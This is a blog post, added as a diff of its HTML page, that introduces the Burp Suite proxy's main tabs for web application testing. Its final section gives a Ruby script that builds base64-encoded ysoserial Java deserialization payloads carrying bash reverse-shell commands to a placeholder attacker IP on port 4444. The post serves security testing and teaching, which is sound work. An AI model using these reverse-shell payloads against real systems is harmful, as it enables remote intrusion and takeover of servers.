@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <title>A guide to Burp Suite | Brandon&#39;s Blog</title>
+
+  <meta charset="UTF-8">
+  <meta name="language" content="en">
+  <meta name="description" content="A guide to the Burp Suite - tips and tricks to get started with Burp and supplement it with scripts with an example using ysoserial">
+  <meta name="keywords" content="burp suite , security , ruby , ysoserial">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  
+  
+
+  <link rel="shortcut icon" type="image/png" href="/favicon.ico" />
+
+  
+  
+    
+ 
+  
+  
+  
+  
+  
+  
+    
+    <link type="text/css" rel="stylesheet" href="/css/post.min.679ea46872c2b319c5ae942c601a7330924fd57451c89d621d6cb129c870c2a8.css" integrity="sha256-Z56kaHLCsxnFrpQsYBpzMJJP1XRRyJ1iHWyxKchwwqg="/>
+  
+    
+    <link type="text/css" rel="stylesheet" href="/css/custom.min.f515d27511835074e6164a4ad60fa9b60192faa3bfe718351449c9367f80bd24.css" integrity="sha256-9RXSdRGDUHTmFkpK1g&#43;ptgGS&#43;qO/5xg1FEnJNn&#43;AvSQ="/>
+  
+  
+   
+   
+    
+
+<script type="application/ld+json">
+  
+    {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/brandonsstewart.com"
+      },
+      "articleSection" : "blog",
+      "name" : "A guide to Burp Suite",
+      "headline" : "A guide to Burp Suite",
+      "description" : "A guide to the Burp Suite - tips and tricks to get started with Burp and supplement it with scripts with an example using ysoserial",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2020",
+      "datePublished": "2020-07-23 00:00:00 \x2b0000 UTC",
+      "dateModified" : "2020-07-23 00:00:00 \x2b0000 UTC",
+      "url" : "https:\/\/brandonsstewart.com\/blog\/guide-to-burp-suite\/",
+      "wordCount" : "1475",
+      "keywords" : ["burp suite", "security", "ruby", "ysoserial", "Blog"]
+    }
+  
+  </script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-172938556-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+</head>
+
+<body>
+  <div class="burger__container">
+  <div class="burger" aria-controls="navigation" aria-label="Menu">
+    <div class="burger__meat burger__meat--1"></div>
+    <div class="burger__meat burger__meat--2"></div>
+    <div class="burger__meat burger__meat--3"></div>
+  </div>
+</div>
+ 
+
+  <nav class="nav" role="navigation">
+  <ul class="nav__list">
+    
+    
+      <li>
+        <a  href="/">about</a>
+      </li>
+    
+      <li>
+        <a  href="/admin.html">admin</a>
+      </li>
+    
+      <li>
+        <a  class="active"
+         href="/blog">blog</a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <main>
+    
+    
+
+    <div class="flex-wrapper">
+      <div class="post__container">
+        <div class="post">
+          <header class="post__header">
+            <h1 id="post__title">A guide to Burp Suite</h1>
+            <time datetime="2020-07-23 00:00:00 &#43;0000 UTC" class="post__date"
+            >Jul 23 2020</time>
+          </header>
+          <article class="post__content">
+              
+<p>In this article I will discuss some of the features I use in the Burp Suite tool. I will also provide a sample of some of the Ruby scripts that I have written and used in conjunction with it.</p>
+<h2 id="what-is-burp-suite">What is Burp Suite?<a class="anchor" href="#what-is-burp-suite">#</a></h2>
+<p>Portswigger, the creator of Burp Suite, describes the Community Edition of Burp Suite as a &ldquo;feature-limited set of manual tools for exploring web security. Proxy your HTTPS traffic, edit and repeat requests, decode data, and more.&quot;.</p>
+<p>Burp is commonly used by security researchers to perform manual and automated testing of web applications.  It is especially useful for manipulating HTTP requests and analyzing how an application responds.</p>
+<h2 id="burp-proxy-basics">Burp Proxy Basics<a class="anchor" href="#burp-proxy-basics">#</a></h2>
+<p>Burp functions as a web proxy, meaning that it will intercept any web traffic that is sent through a particular port.  By default, it will use port <code>8080</code>.  Before starting Burp or getting it set up, you will want to set up a proxy server on your web browser of choice.</p>
+<p>I use a Firefox extension called <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> to manage my Burp proxy. You can also configure a web proxy manually through your browser settings.</p>
+<p>An alternative to this approach would be to have two browsers running, one that you use to generate web traffic to the application you are analyzing, and another to conduct research.</p>
+<p>You can also <a href="https://portswigger.net/support/installing-burp-suites-ca-certificate-in-your-browser">generating a certificate for Burp to use</a> if you want to test a website that is not local to your environment.</p>
+<h2 id="capturing-traffic">Capturing Traffic<a class="anchor" href="#capturing-traffic">#</a></h2>
+<p>When you first launch Burp and navigate to your target application, you will likely see something like this under the <code>navigation</code> tab:</p>
+<p><img src="https://user-images.githubusercontent.com/20469703/87994313-9f167b80-caba-11ea-81cd-817021da5ab2.png" alt="image"></p>
+<p>This is intercepting the traffic and allowing you to modify it and either forward it along (send it) or drop it (don&rsquo;t send it). You also have the option of <code>sending</code> this request to other Burp tabs using the <code>Action</code> button.</p>
+<p>Typically, I will turn this feature off and use some of the other manual features such as the <code>HTTP history</code>, <code>Repeater</code>, or the <code>Target</code> tab to review network requests.</p>
+<h2 id="the-request-and-response-tabs">The Request and Response tabs<a class="anchor" href="#the-request-and-response-tabs">#</a></h2>
+<p>The request and response tabs are present in most of the interfaces I will be covering.</p>
+<p>The request tab, as its name implies, provides information about the request that was made to the server through the Burp Proxy.</p>
+<p>The <code>raw</code> view shows the raw request:
+<img src="https://user-images.githubusercontent.com/20469703/87995073-80b17f80-cabc-11ea-8acc-eb3089aee3d4.png" alt="image">
+And the <code>headers</code> view shows the headers from the request:
+<img src="https://user-images.githubusercontent.com/20469703/87995139-b0608780-cabc-11ea-8a91-9351cfcc011a.png" alt="image">
+The response tab will show what the server responded with:
+<img src="https://user-images.githubusercontent.com/20469703/87997479-2f58be80-cac3-11ea-9abe-76f0e92829d8.png" alt="image"></p>
+<h2 id="the-target-tab">The Target Tab<a class="anchor" href="#the-target-tab">#</a></h2>
+<p>Heading back to to the main navigation, you will see the <code>Target</code> tab.  The Target tab presents a hierarchical view of the site with the various pages available on the target application.  In this example, I am using a simple Rails API that has a <code>/library/books/&lt;id&gt;</code> RESTful API endpoint:</p>
+<p><img src="https://user-images.githubusercontent.com/20469703/87994885-0ed93600-cabc-11ea-9f43-4aee9173b9a9.png" alt="image"></p>
+<p>As you can see above, it shows the routes of <code>library/books/1</code> and <code>library/books/2</code>.  This view is helpful for getting a general feel for how a website is structured.  I don&rsquo;t really tend to use this tab very often.</p>
+<h2 id="the-proxy-tab">The Proxy Tab<a class="anchor" href="#the-proxy-tab">#</a></h2>
+<p>The Proxy tab is the area of Burp that I spend a lot of my time in when analyzing an application.</p>
+<p><img src="https://user-images.githubusercontent.com/20469703/87995235-eef64200-cabc-11ea-8177-478eb49bf36b.png" alt="image"></p>
+<p>One of the most useful parts of this view is that you can compare various aspects of the responses and requests in the table view.  In the example above, you may notice that the response length and response status is different between the two requests.</p>
+<p>This is an example of why this tab is useful - it can allow you see if a particular request to the same endpoint results in a different response from the server.  In this particular example it is not significant, but in some cases this can be an initial clue pointing towards a potential vulnerability.</p>
+<h2 id="the-repeater-tab">The Repeater Tab<a class="anchor" href="#the-repeater-tab">#</a></h2>
+<p>The Repeater tab is useful when you have discovered odd behavior in a target application and want to do a series of requests with slightly different content.</p>
+<p><img src="https://user-images.githubusercontent.com/20469703/87995581-e5210e80-cabd-11ea-9834-60d91235daa9.png" alt="image"></p>
+<p>You can modify any aspect of the HTTP request, including the header, HTTP action, User agent etc.  You can also <em>add</em> parameters or completely omit parameters from here.</p>
+<p><img src="https://user-images.githubusercontent.com/20469703/87995969-ee5eab00-cabe-11ea-9951-ae604b55c0f9.png" alt="image"></p>
+<p>In this example, I have intentionally created a vulnerable application.  As you can see, sending <code>Logger</code> instead of an ID results in some unexpected behavior.</p>
+<p>The repeater tab is a bit easier than manually making browser requests.  It also does not appear in the Burp proxy history, so it can cut down on some of the noise when trying a bunch of different requests.</p>
+<h2 id="the-intruder-tab">The Intruder Tab<a class="anchor" href="#the-intruder-tab">#</a></h2>
+<p>The intruder tab is used to send a large number of requests to a particular endpoint.  This can be a list that you type out manually or a <code>.txt</code> file that you&rsquo;ve created specifically for that purpose.  I tend to only use the <code>sniper</code> option since I usually only test a single variant at a time.</p>
+<p>To send a particular request to Intruder, you can use the following menu option from the proxy tab:</p>
+<p><img src="https://user-images.githubusercontent.com/20469703/87996118-4b5a6100-cabf-11ea-8488-49789fcb3aca.png" alt="image"></p>
+<p>Once there, you can define which part of the request you&rsquo;d like to make dynamic.  In this example, I am setting the <code>id</code> parameter of the URL as my payload marker:</p>
+<p><img src="https://user-images.githubusercontent.com/20469703/87996232-865c9480-cabf-11ea-9c50-791cfea6fb09.png" alt="image"></p>
+<p>The next tab will be used to actually set the <code>Payloads</code> options.</p>
+<p><img src="https://user-images.githubusercontent.com/20469703/87996308-c3288b80-cabf-11ea-9ff3-e76072cc4917.png" alt="image"></p>
+<p>You can paste in a list, load a list from a <code>.txt</code> file, or manually add terms here.
+<img src="https://user-images.githubusercontent.com/20469703/87996375-fa973800-cabf-11ea-930a-469e12bb3e80.png" alt="image"></p>
+<p>You can click the <code>Start Attack</code> button to run the attack. Once you run the attack, you can then observe the results:</p>
+<p><img src="https://user-images.githubusercontent.com/20469703/87996410-100c6200-cac0-11ea-8eae-24b3bb662160.png" alt="image"></p>
+<p>In this example, any strings that are Rails objects that I pass in as arguments result in error code <code>500</code>, but other inputs tend to results in <code>200</code>, or <code>304</code>. This would further confirm some of the behavior I noticed when using the <code>Repeater</code> functionality earlier.</p>
+<p>The intruder tab can be useful if you encounter an area of a web application that seems to respond differently to different types of input.  This can be useful for narrowing down what kind of potential vulnerability or unexpected behavior the server might be producing.</p>
+<h2 id="using-scripts-with-burp">Using scripts with Burp<a class="anchor" href="#using-scripts-with-burp">#</a></h2>
+<p>One of the most powerful uses for Burp is using it alongside a scripting language of some kind.  Because Burp is a proxy, you can proxy a script&rsquo;s request through Burp just like you can with a browser request.</p>
+<pre><code class="language-ruby">require 'faraday'
+
+url = &quot;website&quot;
+conn = Faraday.new(url, ssl: {verify: false}) do |conn|
+  conn.proxy = &quot;http://localhost:8080&quot;
+end
+response = conn.get
+print response
+</code></pre>
+<p>This is a very simple example, but this code uses Ruby&rsquo;s Faraday gem to make a request through the Burp proxy.  This will allow requests generated from this script to to appear in the Burp proxy.  If I am writing a proof of concept exploit script, for example, this would allow me to observe the requests in Burp and compare them with requests that I have successfully made against the server.</p>
+<h2 id="generating-intruder-payloads-with-ysoserial-and-ruby">Generating Intruder Payloads with ysoserial and Ruby<a class="anchor" href="#generating-intruder-payloads-with-ysoserial-and-ruby">#</a></h2>
+<p>Ysoserial is a powerful tool that is used to create gadget chains to exploit Deserialization vulnerabilities in Java.  Basically, this will create a string of some kind that contains malicious code that can result in arbitrary code execution within a Java application.</p>
+<p>While attempting to exploit a deserialization vulnerability in a Java application, I wrote the following script to generate a text file of ysoserial payloads encoded in base64.</p>
+<p>In addition to the ysoserial payload, this also uses loops through 3 different commands to include in each of the payloads.  The three payloads tested 2 variations of a bash reverse shell that connects to a netcat listener, and one test for a command injection by seeing if I could create a file using the <code>touch</code> command.</p>
+<p>After generating the payload from ysoserial it encodes the output of the ysoserial command in base64, which is commonly used by Java web applications to receive a serialized object, and saves the resulting string to a new line of the text file.</p>
+<pre><code class="language-ruby">require 'base64'
+cmd = &quot;bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/4444 0&gt;&amp;1&quot;
+cmd2 = &quot;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;attacker_ip&gt;/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&quot;
+cmd3 = 'touch HAAXXXED.txt'
+payloads = %w(BeanShell1 C3P0 Clojure CommonsBeanutils1 CommonsCollections1
+   CommonsCollections2 CommonsCollections3 CommonsCollections4
+   CommonsCollections5 CommonsCollections6  FileUpload1 Groovy1 Hibernate1
+   Hibernate2 FileUpload1 JBossInterceptors1 JRMPClient JRMPListener JSON1
+   JavassistWeld1 Jdk7u21 Jython1 MozillaRhino1 Myfaces1 Myfaces2 ROME
+   Spring1 Spring2 URLDNS Wicket1)
+[cmd, cmd2, cmd3].each do |cmd|
+  payloads.each do |payload|
+    system(&quot;java -jar ysoserial.jar #{payload} \&quot;#{cmd}\&quot; &gt;&gt; temp_file.jar&quot;)
+    content = File.open('temp_file.jar', 'rb')
+    next unless content
+    encoded_payload = Base64.strict_encode64(content)
+    File.write(&quot;payloads.txt&quot;, encoded_payload, mode: &quot;a&quot;)
+    File.write(&quot;payloads.txt&quot;, &quot;\n&quot;, mode: &quot;a&quot;)
+    `rm temp_file.jar`
+  end
+end
+</code></pre>
+<p>I was able to use this to determine if the application was vulnerable to one of the gadget chains within ysoserial. Once this text file was generated, I was able to use it as an intruder payload, effectively using Burp to fuzz the application in a targeted, and controlled way.</p>
+<h2 id="burp">Burp<a class="anchor" href="#burp">#</a></h2>
+<p>Burp is a fantastic tool to use for analyzing a web application for vulnerabilities.  You can also use scripts to enhance Burp&rsquo;s utility when analyzing a web application for vulnerabilities.</p>
+
+
+              
+          </article>
+          
+
+ <div class="pagination">
+  
+    <a class="pagination__item" href="https://brandonsstewart.com/blog/protecting-against-command-injection/">
+        <span class="pagination__label">Previous Post</span>
+        <span class="pagination__title">Protecting Against Command Injection</span>
+    </a>
+  
+
+  
+</div>
+
+          
+          <footer class="post__footer">
+            
+
+
+<div class="social-icons">
+  
+     
+    
+  
+     
+    
+      <a class="social-icons__link" title="GitHub"
+         href="https://github.com/boveus"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('https://brandonsstewart.com/svg/github.svg')"></div>
+      </a>
+    
+  
+     
+    
+      <a class="social-icons__link" title="Email"
+         href="mailto:me@brandonsstewart.com"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('https://brandonsstewart.com/svg/email.svg')"></div>
+      </a>
+    
+  
+     
+    
+  
+     
+    
+  
+     
+    
+  
+     
+    
+      <a class="social-icons__link" title="LinkedIn"
+         href="https://www.linkedin.com/in/brandon-scott-stewart/"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('https://brandonsstewart.com/svg/linkedin.svg')"></div>
+      </a>
+    
+  
+     
+    
+     
+</div>
+
+            <p></p>
+          </footer>
+          </div>
+      </div>
+      
+    </div>
+    
+
+  </main>
+
+   
+
+  
+  <script src="/js/index.min.49e4d8a384357d9b445b87371863419937ede9fa77737522ffb633073aebfa44.js" integrity="sha256-SeTYo4Q1fZtEW4c3GGNBmTft6fp3c3Ui/7YzBzrr&#43;kQ=" crossorigin="anonymous"></script>
+  
+  
+  <script src="https://unpkg.com/prismjs@1.20.0/components/prism-core.min.js"></script>
+
+  
+  <script src="https://unpkg.com/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"
+    data-autoloader-path="https://unpkg.com/prismjs@1.20.0/components/"></script>
+
+  
+
+
+</body>
+
+</html>
